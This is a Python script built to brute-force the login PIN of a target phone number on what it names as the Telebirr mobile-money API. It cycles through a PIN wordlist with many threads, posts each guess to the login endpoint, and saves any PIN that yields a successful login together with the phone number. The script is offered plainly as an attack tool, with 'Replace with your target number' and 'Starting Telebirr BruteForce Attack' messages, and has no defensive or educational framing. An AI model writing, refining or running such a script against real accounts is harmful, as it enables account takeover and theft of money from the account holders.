""
import requests
import threading
import time

# Target API URL
API_URL = 'https://api.telebirr.et/api/login'

# Target Phone Number
PHONE_NUMBER = '09xxxxxxxx'  # Replace with your target number

# PIN Dictionary
def load_pins():
    with open('wordlist.txt', 'r') as file:
        return file.read().splitlines()

# BruteForce Function
def brute_force(pin):
    payload = {
        'phone': PHONE_NUMBER,
        'pin': pin
    }
    
    response = requests.post(API_URL, json=payload)
    
    if 'success' in response.text:
        print(f'[+] PIN Cracked: {pin}')
        with open('cracked.txt', 'w') as file:
            file.write(f'Phone: {PHONE_NUMBER}\nPIN: {pin}')
        exit()
    else:
        print(f'[-] Trying PIN: {pin}')

# Multi-threading Speed
def start_attack():
    pins = load_pins()
    threads = []
    
    for pin in pins:
        thread = threading.Thread(target=brute_force, args=(pin,))
        thread.start()
        threads.append(thread)
        time.sleep(0.1)
        
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    print("[+] Starting Telebirr BruteForce Attack...")
    start_attack()
    print("[-] Attack Finished!")
""